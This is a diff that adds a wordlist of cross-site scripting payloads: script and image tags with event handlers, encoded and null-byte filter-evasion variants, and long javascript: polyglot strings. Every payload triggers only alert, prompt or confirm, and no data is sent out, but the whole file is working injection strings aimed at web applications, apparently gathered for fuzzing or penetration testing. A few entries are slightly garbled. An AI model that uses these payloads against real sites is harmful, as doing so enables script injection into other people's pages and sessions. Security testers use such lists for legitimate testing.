@@ -1,0 +1,331 @@
+alert(3)
+'><script class="XSS">propt(3)</script><'
+'><script class="XSS">alert('DAXE')</script><'
+'><img class="XSS" src="#" onerror="ale"><'
+<script class="XSS">alert(3)</script>
+<img%20 class="XSS" src=da%20onerror=alert('DAXE')>DEDE/S
+"><img%20 class="XSS" src=da%20onerror=alert('DAXE')><"
+"><xml class="XSS" onreadystatechange=alert('DAXE')><"
+"><style  class="XSS" onreadystatechange=alert('DAXE')><"
+"><iframe class="XSS" onreadystatechange=alert('DAXE')><"
+"><object class="XSS" onerror=alert('DAXE')><"
+"><object class="XSS" type=image src=valid.gif onreadystatechange=alert('DAXE')></object><"
+"><img class="XSS" type=image src=valid.gif onreadystatechange=alert('DAXE')><"
+"><input class="XSS" type=image src=valid.gif onreadystatechange=alert('DAXE')><"
+"><isindex class="XSS" type=image src=valid.gif onreadystatechange=alert('DAXE')><"
+"><script class="XSS" onreadystatechange=alert('DAXE')><"
+"><bgsound class="XSS" onpropertychange=alert('DAXE')><"
+"><body class="XSS" onbeforeactivate=alert('DAXE')><"
+"><body class="XSS" onactivate=alert('DAXE')><"
+";alert('DAXE')";"
+"><body class="XSS" onfocusin=alert('DAXE')><"
+"><input class="XSS" autofocus onfocus=alert('DAXE')><"
+"></a class="XSS" onmousemove=alert('DAXE')><"
+"><input class="XSS" onblur=alert('DAXE') autofocus><input autofocus><"
+"><body class="XSS" onscroll=alert('DAXE')><br><br>...<br><input autofocus><"
+"><x class="XSS" style=x:expression(alert('DAXE'))><" 
+var%20str%20=%20"jaVasCript:/*-/*`/*\`/*%27/*"/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg class="XSS"/oNloAd=alert()//>\x3e";
+"><x style=behavior:url(#default#time2) onbegin=alert('DAXE')>"<
+"><iMg onerror=alert('DAXE') src=a><"
+"><[%00]img class="XSS" onerror=alert('DAXE')><"
+"><i[%00]mg  class="XSS" onerror=alert('DAXE') src=a><"
+"><img/ class="XSS" onerror=alert('DAXE') src=a><"
+"><img[%09] class="XSS" onerror=alert('DAXE') src=a><"
+"><img[%0d] class="XSS" onerror=alert('DAXE') src=a><"
+"><img[%0a] class="XSS" onerror=alert('DAXE') src=a><"
+"><img/” class="XSS" onerror=alert('DAXE') src=a><"
+"><img/’ class="XSS" onerror=alert('DAXE') src=a><"
+"><img/anyjunk/ class="XSS" onerror=alert('DAXE') src=a><"
+"><script class="XSS" /anyjunk>alert('DAXE')</script><"
+"><img class="XSS" o[%00]nerror=alert('DAXE') src=a><"
+"><img class="XSS" onerror=”alert('DAXE')”src=a><"
+"><img class="XSS" onerror=’alert('DAXE')’src=a><"
+"><img class="XSS" onerror=`alert('DAXE')"`src=a><"
+"><img class="XSS" onerror=al[%00]ert('DAXE') src=a><"
+"><img class="XSS" onerror=a&#x6c;ert(1) src=a><"
+"><iframe class="XSS" src=j&#x61;vasc&#x72ipt&#x3a;alert('DAXE')&#x28;1&#x29; ><"
+"><img class="XSS" onerror=a&#x06c;ert(1) src=a><"
+'><script class="XSS">alert(3)</script><'
+"><img class="XSS" onerror=a&#x006c;ert(1) src=a><"
+"><img class="XSS" onerror=a&#x0006c;ert(1) src=a><"
+"><img class="XSS" onerror=a&#108;ert(1) src=a><"
+"><img class="XSS" onerror=a&#0108;ert(1) src=a><"
+"><img class="XSS" onerror=a&#108ert(1) src=a><"
+"><img class="XSS" onerror=a&#0108ert(1) src=a><"
+">%3cimg class="XSS" onerror=alert('DAXE') src=a%3e<"
+">%253cimg%20 class="XSS" onerror=alert('DAXE')%20src=a%253e<"
+alert(3)
+'><script class="XSS">alert(1337)</script><'
+'><script class="XSS">alert(3)</script><'
+'><img class="XSS" src="#" onerror="alert(1337)"><'
+<script class="XSS">alert(3)</script>
+<img%20 class="XSS" src=da%20onerror=alert(1337)>DEDE/S
+"><img%20 class="XSS" src=da%20onerror=alert(1337)><"
+"><xml class="XSS" onreadystatechange=alert(1337)><"
+"><style  class="XSS" onreadystatechange=alert(1337)><"
+"><iframe class="XSS" onreadystatechange=alert(1337)><"
+"><object class="XSS" onerror=alert(1337)><"
+"><object class="XSS" type=image src=valid.gif onreadystatechange=alert(1337)></object><"
+"><img class="XSS" type=image src=valid.gif onreadystatechange=alert(1337)><"
+"><input class="XSS" type=image src=valid.gif onreadystatechange=alert(1337)><"
+"><isindex class="XSS" type=image src=valid.gif onreadystatechange=alert(1337)><"
+"><script class="XSS" onreadystatechange=alert(1337)><"
+"><bgsound class="XSS" onpropertychange=alert(1337)><"
+"><body class="XSS" onbeforeactivate=alert(1337)><"
+"><body class="XSS" onactivate=alert(1337)><"
+";1;" 
+"><body class="XSS" onfocusin=alert(1337)><"
+"><input class="XSS" autofocus onfocus=alert(1337)><"
+"></a class="XSS" onmousemove=alert(1337)><"
+"><input class="XSS" onblur=alert(1337) autofocus><input autofocus><"
+"><body class="XSS" onscroll=alert(1337)><br><br>...<br><input autofocus><"
+"><x class="XSS" style=x:expression(alert(1337))><" 
+var%20str%20=%20"jaVasCript:/*-/*`/*\`/*%27/*"/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg class="XSS"/oNloAd=alert()//>\x3e";
+"><x style=behavior:url(#default#time2) onbegin=alert(1337)>"<
+"><iMg class="XSS" onerror=alert(1337)src=a><"
+"><[%00]img class="XSS" onerror=alert(1337) src=a><"
+"><i[%00]mg  class="XSS" onerror=alert(1337)src=a><"
+"><img/ class="XSS" onerror=alert(1337) src=a><"
+"><img[%09] class="XSS" onerror=alert(1337) src=a><"
+"><img[%0d] class="XSS" onerror=alert(1337) src=a><"
+"><img[%0a] class="XSS" onerror=alert(1337) src=a><"
+"><img/” class="XSS" onerror=alert(1337) src=a><"
+"><img/’ class="XSS" onerror=alert(1337) src=a><"
+"><img/anyjunk/ class="XSS" onerror=alert(1337) src=a><"
+"><script class="XSS" /anyjunk>alert(1337)</script><"
+"><img class="XSS" o[%00]nerror=1 src=a><"
+"><img class="XSS" onerror=”alert(1337)”src=a><"
+"><img class="XSS" onerror=’alert(1337)’src=a><"
+"><img class="XSS" onerror=`alert(1337)`src=a><"
+"><img class="XSS" onerror=al[%00]ert(1337) src=a><"
+"><img class="XSS" onerror=a&#x6c;ert(1337) src=a><"
+"><iframe class="XSS" src=j&#x61;vasc&#x72ipt&#x3a;1&#x28;1&#x29; ><"
+"><img class="XSS" onerror=a&#x06c;ert(1337) src=a><"
+'><script class="XSS">alert(1337)</script><'
+"><img class="XSS" onerror=a&#x006c;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#x0006c;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#108;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#0108;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#108ert(1337) src=a><"
+"><img class="XSS" onerror=a&#0108ert(1337) src=a><"
+">%3cimg class="XSS" onerror=alert(1337) src=a%3e<"
+">%253cimg%20 class="XSS" onerror=alert(1337)%20src=a%253e<"
+prompt(3)
+'><script class="XSS">prompt(1337)</script><'
+'><script class="XSS">prompt(3)</script><'
+'><img class="XSS" src="#" onerror="prompt(1337)"><'
+<script class="XSS">prompt(3)</script>
+<img%20 class="XSS" src=da%20onerror=prompt(1337)>DEDE/S
+"><img%20 class="XSS" src=da%20onerror=prompt(1337)><"
+"><xml class="XSS" onreadystatechange=prompt(1337)><"
+"><style  class="XSS" onreadystatechange=prompt(1337)><"
+"><iframe class="XSS" onreadystatechange=prompt(1337)><"
+"><object class="XSS" onerror=prompt(1337)><"
+"><object class="XSS" type=image src=valid.gif onreadystatechange=prompt(1337)></object><"
+"><img class="XSS" type=image src=valid.gif onreadystatechange=prompt(1337)><"
+"><input class="XSS" type=image src=valid.gif onreadystatechange=prompt(1337)><"
+"><isindex class="XSS" type=image src=valid.gif onreadystatechange=prompt(1337)><"
+"><script class="XSS" onreadystatechange=prompt(1337)><"
+"><bgsound class="XSS" onpropertychange=prompt(1337)><"
+"><body class="XSS" onbeforeactivate=prompt(1337)><"
+"><body class="XSS" onactivate=prompt(1337)><"
+";1;" 
+"><body class="XSS" onfocusin=prompt(1337)><"
+"><input class="XSS" autofocus onfocus=prompt(1337)><"
+"></a class="XSS" onmousemove=prompt(1337)><"
+"><input class="XSS" onblur=prompt(1337) autofocus><input autofocus><"
+"><body class="XSS" onscroll=prompt(1337)><br><br>...<br><input autofocus><"
+"><x class="XSS" style=x:expression(prompt(1337))><" 
+var%20str%20=%20"jaVasCript:/*-/*`/*\`/*%27/*"/**/(/*%20*/oNcliCk=prompt()%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg class="XSS"/oNloAd=prompt()//>\x3e";
+"><x style=behavior:url(#default#time2) onbegin=prompt(1337)>"<
+"><iMg class="XSS" onerror=prompt(1337)src=a><"
+"><[%00]img class="XSS" onerror=prompt(1337) src=a><"
+"><i[%00]mg  class="XSS" onerror=prompt(1337)src=a><"
+"><img/ class="XSS" onerror=prompt(1337) src=a><"
+"><img[%09] class="XSS" onerror=prompt(1337) src=a><"
+"><img[%0d] class="XSS" onerror=prompt(1337) src=a><"
+"><img[%0a] class="XSS" onerror=prompt(1337) src=a><"
+"><img/” class="XSS" onerror=prompt(1337) src=a><"
+"><img/’ class="XSS" onerror=prompt(1337) src=a><"
+"><img/anyjunk/ class="XSS" onerror=prompt(1337) src=a><"
+"><script class="XSS" /anyjunk>prompt(1337)</script><"
+"><img class="XSS" o[%00]nerror=1 src=a><"
+"><img class="XSS" onerror=”prompt(1337)”src=a><"
+"><img class="XSS" onerror=’prompt(1337)’src=a><"
+"><img class="XSS" onerror=`prompt(1337)`src=a><"
+"><img class="XSS" onerror=al[%00]ert(1337) src=a><"
+"><img class="XSS" onerror=a&#x6c;ert(1337) src=a><"
+"><iframe class="XSS" src=j&#x61;vasc&#x72ipt&#x3a;1&#x28;1&#x29; ><"
+"><img class="XSS" onerror=a&#x06c;ert(1337) src=a><"
+'><script class="XSS">prompt(1337)</script><'
+"><img class="XSS" onerror=a&#x006c;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#x0006c;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#108;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#0108;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#108ert(1337) src=a><"
+"><img class="XSS" onerror=a&#0108ert(1337) src=a><"
+">%3cimg class="XSS" onerror=prompt(1337) src=a%3e<"
+">%253cimg%20 class="XSS" onerror=prompt(1337)%20src=a%253e<"
+confirm(3)
+'><script class="XSS">confirm(1337)</script><'
+'><script class="XSS">confirm(1377)</script><'
+'><img class="XSS" src="#" onerror="confirm(1337)"><'
+<script class="XSS">confirm(3)</script>
+<img%20 class="XSS" src=da%20onerror=confirm(1337)>DEDE/S
+"><img%20 class="XSS" src=da%20onerror=confirm(1337)><"
+"><xml class="XSS" onreadystatechange=confirm(1337)><"
+"><style  class="XSS" onreadystatechange=confirm(1337)><"
+"><iframe class="XSS" onreadystatechange=confirm(1337)><"
+"><object class="XSS" onerror=confirm(1337)><"
+"><object class="XSS" type=image src=valid.gif onreadystatechange=confirm(1337)></object><"
+"><img class="XSS" type=image src=valid.gif onreadystatechange=confirm(1337)><"
+"><input class="XSS" type=image src=valid.gif onreadystatechange=confirm(1337)><"
+"><isindex class="XSS" type=image src=valid.gif onreadystatechange=confirm(1337)><"
+"><script class="XSS" onreadystatechange=confirm(1337)><"
+"><bgsound class="XSS" onpropertychange=confirm(1337)><"
+"><body class="XSS" onbeforeactivate=confirm(1337)><"
+"><body class="XSS" onactivate=confirm(1337)><"
+";confirm(1337);" 
+"><body class="XSS" onfocusin=confirm(1337)><"
+"><input class="XSS" autofocus onfocus=confirm(1337)><"
+"></a class="XSS" onmousemove=confirm(1337)><"
+"><input class="XSS" onblur=confirm(1337) autofocus><input autofocus><"
+"><body class="XSS" onscroll=confirm(1337)><br><br>...<br><input autofocus><"
+"><x class="XSS" style=x:expression(confirm(1337))><" 
+var%20str%20=%20"jaVasCript:/*-/*`/*\`/*%27/*"/**/(/*%20*/oNcliCk=confirm()%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg class="XSS"/oNloAd=confirm()//>\x3e";
+"><x style=behavior:url(#default#time2) onbegin=confirm(1337)>"<
+"><iMg class="XSS" onerror=confirm(1337)src=a><"
+"><[%00]img class="XSS" onerror=confirm(1337) src=a><"
+"><i[%00]mg  class="XSS" onerror=confirm(1337)src=a><"
+"><img/ class="XSS" onerror=confirm(1337) src=a><"
+"><img[%09] class="XSS" onerror=confirm(1337) src=a><"
+"><img[%0d] class="XSS" onerror=confirm(1337) src=a><"
+"><img[%0a] class="XSS" onerror=confirm(1337) src=a><"
+"><img/” class="XSS" onerror=confirm(1337) src=a><"
+"><img/’ class="XSS" onerror=confirm(1337) src=a><"
+"><img/anyjunk/ class="XSS" onerror=confirm(1337) src=a><"
+"><script class="XSS" /anyjunk>confirm(1337)</script><"
+"><img class="XSS" o[%00]nerror=1 src=a><"
+"><img class="XSS" onerror=”confirm(1337)”src=a><"
+"><img class="XSS" onerror=’confirm(1337)’src=a><"
+"><img class="XSS" onerror=`confirm(1337)`src=a><"
+"><img class="XSS" onerror=al[%00]ert(1337) src=a><"
+"><img class="XSS" onerror=a&#x6c;ert(1337) src=a><"
+"><iframe class="XSS" src=j&#x61;vasc&#x72ipt&#x3a;1&#x28;1&#x29; ><"
+"><img class="XSS" onerror=a&#x06c;ert(1337) src=a><"
+'><script class="XSS">confirm(1337)</script><'
+"><img class="XSS" onerror=a&#x006c;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#x0006c;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#108;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#0108;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#108ert(1337) src=a><"
+"><img class="XSS" onerror=a&#0108ert(1337) src=a><"
+">%3cimg class="XSS" onerror=confirm(1337) src=a%3e<"
+">%253cimg%20 class="XSS" onerror=confirm(1337)%20src=a%253e<"
+confirm(3)
+'><script class="XSS">eval("al"+"ert(1337)")</script><'
+'><script class="XSS">eval("al"+"ert(1337)")</script><'
+'><img class="XSS" src="#" onerror="confirm(1337)"><'
+<script class="XSS">eval("al"+"ert(1337)")</script>
+<img%20 class="XSS" src=da%20onerror=confirm(1337)>DEDE/S
+"><img%20 class="XSS" src=da%20onerror=confirm(1337)><"
+"><xml class="XSS" onreadystatechange=confirm(1337)><"
+"><style  class="XSS" onreadystatechange=confirm(1337)><"
+"><iframe class="XSS" onreadystatechange=confirm(1337)><"
+"><object class="XSS" onerror=confirm(1337)><"
+"><object class="XSS" type=image src=valid.gif onreadystatechange=confirm(1337)></object><"
+"><img class="XSS" type=image src=valid.gif onreadystatechange=confirm(1337)><"
+"><input class="XSS" type=image src=valid.gif onreadystatechange=confirm(1337)><"
+"><isindex class="XSS" type=image src=valid.gif onreadystatechange=confirm(1337)><"
+"><script class="XSS" onreadystatechange=confirm(1337)><"
+"><bgsound class="XSS" onpropertychange=confirm(1337)><"
+"><body class="XSS" onbeforeactivate=confirm(1337)><"
+"><body class="XSS" onactivate=confirm(1337)><"
+";confirm(1337);" 
+"><body class="XSS" onfocusin=confirm(1337)><"
+"><input class="XSS" autofocus onfocus=confirm(1337)><"
+"></a class="XSS" onmousemove=confirm(1337)><"
+"><input class="XSS" onblur=confirm(1337) autofocus><input autofocus><"
+"><body class="XSS" onscroll=confirm(1337)><br><br>...<br><input autofocus><"
+"><x class="XSS" style=x:expression(confirm(1337))><" 
+var%20str%20=%20"jaVasCript:/*-/*`/*\`/*%27/*"/**/(/*%20*/oNcliCk=confirm()%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg class="XSS"/oNloAd=confirm()//>\x3e";
+"><x style=behavior:url(#default#time2) onbegin=confirm(1337)>"<
+"><iMg class="XSS" onerror=confirm(1337)src=a><"
+"><[%00]img class="XSS" onerror=confirm(1337) src=a><"
+"><i[%00]mg  class="XSS" onerror=confirm(1337)src=a><"
+"><img/ class="XSS" onerror=confirm(1337) src=a><"
+"><img[%09] class="XSS" onerror=confirm(1337) src=a><"
+"><img[%0d] class="XSS" onerror=confirm(1337) src=a><"
+"><img[%0a] class="XSS" onerror=confirm(1337) src=a><"
+"><img/” class="XSS" onerror=confirm(1337) src=a><"
+"><img/’ class="XSS" onerror=confirm(1337) src=a><"
+"><img/anyjunk/ class="XSS" onerror=confirm(1337) src=a><"
+"><script class="XSS" /anyjunk>confirm(1337)</script><"
+<svg class="XSS" onload="void 'javascript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e';"></svg>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg class="XSS"/*/onload=alert()//>
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg class="XSS" /onload=/*<html/*/onmouseover=alert()//> 
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg class="XSS" onload=/*<html/*/onmouseover=alert()//>
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg class="XSS" /onload='/*--><html */ onmouseover=alert()//'>` 
+javascript:`/*\"/*--><svg onload='/*</template></noembed></noscript></style></title></textarea></script><html class="XSS" onmouseover="/**/ alert()//'">`
+javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/<i<frame class="XSS" */ onload=alert()//</script>
+javascript:"/*`/*\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*<i<frame class="XSS" /*/ onload=alert()//</Script> 
+javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript><<script/>/<frame class="XSS" */; onload=alert()//<</script>`
+javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript><<script/>/<frame class="XSS" */; onload=alert()//<</script>` 
+javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame <svg class="XSS""///*/ onload=alert()//</script> 
+javascript:/*"//'//`//\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame class="XSS"/<svg/*/onload= alert()//</script> 
+javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame class="XSS" /<svg */ onload=alert()//</script> 
+javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*<svg class="XSS"<frame */ onload=alert()//</script> 
+javascript:/*"/*'/*\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame <svg */ onload=alert()//</script> 
+javascript:/*"/*`/*'/*\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*<svg <frame onload=/**/alert()//</script>
+javascript:"/*'//`//\"//</title></template/</textarea/</style/</noscript/</noembed/</script>--><<script>alert()<</script><frame/*/ onload=alert()//>
+javascript:alert()"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//<svg <frame class="XSS" */onload= alert()//</script>
+javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame class="XSS" /onload=alert()--><<svg/*/ class="XSS" onload=alert()//>
+javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME class="XSS" /onload=/**/alert()//--><<sVg class="XSS" /onload=alert``> 
+javascript:/*--></script></textarea></style></noscript>\"</noembed>[`</template>["</select>['</title>]<<script>///<frame class="XSS" */ onload=alert()//<</script>
+javascript:"/*\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame class="XSS" /onload=alert()><<svg class="XSS" /onload= /**/alert()//>
+javascript:/*"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script><<script> /**/alert()//<</script><frame class="XSS" onload=alert()>
+javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noembed></script><<script>/*` /*<frame  class="XSS" src=javascript:/**/alert()//><</script>
+javascript:"/*'/*\"/*` /**/alert()//--></title></textarea></style></noscript></noembed></template></script><script class="XSS" >alert()</script><svg/<frame class="XSS" /onload=alert()>
+javascript:/*"/*`/*'/*\"/*-->*/ alert()//</title></textarea></style></noscript></noembed></template></script></select><frame class="XSS" /onload=alert``><<svg class="XSS" /onload=alert()>
+javascript:`/*</title></style></textarea></noscript></script></noembed></template></select/"/'/*--><frame class="XSS" onload=alert()><svg/\"/*<svg class="XSS" onload=' /**/-alert()//'>javascript:/*`/*\"/*'/*</noembed>"/*<frame class="XSS" src=javascript:/**/;alert()//--></title></textarea></style></noscript></template></select></script><<svg class="XSS"/onload= alert()//>
+javascript:alert()//"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script class="XSS" >*/ alert()//<frame class="XSS" onload=alert()><<script class="XSS">alert()<</script>
+javascript:alert()//'//"//\"//-->`//*/ alert();//</title></textarea></style></noscript></noembed></template><frame class="XSS" onload=alert()></select></script><<svg class="XSS" onload=alert()>
+javascript:/*"/*\"/*`/*'/**/ (alert())//</title></textarea></style></noscript></script></noembed></template></select><frame class="XSS" src=javascript:alert()--><<svg class="XSS" /onload=alert()>
+javascript:/*"/*'/*\"/*`/*><frame src=javascript:alert()></template </textarea </title </style </noscript </noembed </script --><<script class="XSS">alert()<</script>\ /**/alert()//
+javascript:/*`/*'/*'/*"-/*\"/**/ alert()//></title></textarea></style></select></script></noembed></noscript></template>--><<svg class="XSS" /onload=alert()><frame class="XSS" /src=javascript:alert()>
+javascript:'/*`/*'/*"/*\"/*<FRAME SRC= javascript:/**/-alert()//--></title></textarea></style></noscript></noembed></template></script><script>//<svg class="XSS" onload= alert()//</script>
+javascript:alert()//--></title></style></noscript></noembed></template></select></textarea><frameset onload=alert()></script>*///\"//`//'//"//><svg <svg class="XSS" onload=alert()> alert()//
+javascript:alert()//'//"//\"; '/`/*\/*'/*"/**/(alert())//</style></template/</title/</textarea/</noscript/</noembed/</script>--><frame <svg onload=alert()><script class="XSS">alert()</script>
+javascript:/*"/*'/*`/*\"/**/ alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>--><<svg onload=alert()><frame class="XSS" src=javascript:alert()>
+javascript:alert()//\"//`//'//"//--></style></select></noscript></noembed></template></title></textarea></script><iframe/srcdoc="<svg/onload=alert()>"><frame class="XSS" /onload=alert()>*/ alert()//
+javascript:alert()//*-->*`/*'/*"/*\"/*</title></textarea></style></noscript></noembed></template><frame src=javascript:alert()></script><script>/*<svg class="XSS" onload=alert()>*/ alert()//</script>
+jaVasCript:/*`/*\`/*'/*\"//"/**/(onload=alert())//<svg/onload=alert()><frame/onload=alert()></select></noscript></noembed></template></stYle/</titLe/</teXtarEa/</script/--><sVg class="XSS" /oNloAd= alert()//>
+javascript:alert()//'//"//`//></a></option></select></template></noscript></script></title></style></textarea></noembed>--><<svg onload=alert()>\">alert()//*/ alert()//<frame class="XSS" src=javascript:alert()>
+javascript:alert()//\ /*<svg/onload=';alert();'></textarea></style></title></noscript></template></noembed><frame onload=";alert();"></script>--><script class="XSS" >alert`;alert();`</script>*/alert()//\";alert()//
+javascript:alert/*`/*\/*'/*\"/*"/**/(alert())// alert()//--></template><frame/onload=alert() <img src=x onerror=alert()></style/</title/</textarea/</noscript/</noembed/</script><script class="XSS" >alert()</script>
+javascript:alert();//</title></noscript></noembed></template></style></textarea><frameset onload='+/"/+/[*/[]/+alert()//'-->\" alert();/*`/**/(/**/alert())//<script>alert()</script><<svg class="XSS" onload=alert()>>
+javascript:alert()//*/alert()/*'-/"/-eval(`(alert())`)//\"-alert()//--></title></style></noscript></textarea></template></noembed><script>alert()</script><frameset onload=alert()><svg class="XSS" /onload=alert(1)> alert()//
+javascript:alert()//\";alert();/*-/*`/*\`/*'/*"/**///--><FRAME SRC="javascript:alert();"></textarea></style></noscript></noembed></template></option></select></script></title><svg class="XSS" /onload=alert()><svg/onload=alert()> alert(1)// 
+javascript:alert()//<frame/src=javascript:alert()><svg/onload=alert()>`;alert()`';alert()//\";alert();//"//--></title></textarea></style></noscript></noembed></template></option></select></script><svg class="XSS" onload=alert()>*/ alert()//* 
+javascript:alert()//</title></style></textarea></noscript></template></noembed><script>alert()</script>-->\";alert()//";alert()//';alert()//<script>alert()</script><frame src="javascript:alert()">` alert()//<svg class="XSS" /onload=alert()>*/alert()/* 
+javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!-- 
+javascript:/*--></title></style></template></noscript></noembed></textarea></script><svg/onload='+/"/+/onclick=1/+/[*/[]/+alert()//'>"><svg class="XSS" /onload=`+/"/+/onclick=/+/[*/[]/+alert()//'>"><script class="XSS" >alert()</script><frame src="javascript:alert()"></frameset>+\"; alert()//<img src onerror=alert()>
+javascript:alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img class="XSS" src=x onerror=alert(1)></title><script class="XSS">alert(1)</script><img class="XSS" src=0 onerror=alert(1)><img class="XSS" src=x:x onerror=alert(1)> alert(1)// 
+"><img class="XSS" o[%00]nerror=1 src=a><"
+"><img class="XSS" onerror=”confirm(1337)”src=a><"
+"><img class="XSS" onerror=’confirm(1337)’src=a><"
+"><img class="XSS" onerror=`confirm(1337)`src=a><"
+"><img class="XSS" onerror=al[%00]ert(1337) src=a><"
+"><img class="XSS" onerror=a&#x6c;ert(1337) src=a><"
+"><iframe class="XSS" src=j&#x61;vasc&#x72ipt&#x3a;1&#x28;1&#x29; ><"
+"><img class="XSS" onerror=a&#x06c;ert(1337) src=a><"
+'><script class="XSS">eval("al"+"ert(1337)")</script><'
+"><img class="XSS" onerror=a&#x006c;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#x0006c;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#108;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#0108;ert(1337) src=a><"
+"><img class="XSS" onerror=a&#108ert(1337) src=a><"
+"><img class="XSS" onerror=a&#0108ert(1337) src=a><"
+">%3cimg class="XSS" onerror=confirm(1337) src=a%3e<"
+">%253cimg%20 class="XSS" onerror=confirm(1337)%20src=a%253e<"
+<scscriptript class="XSS">eval("al"+"ert(1337)")</scscriptript>
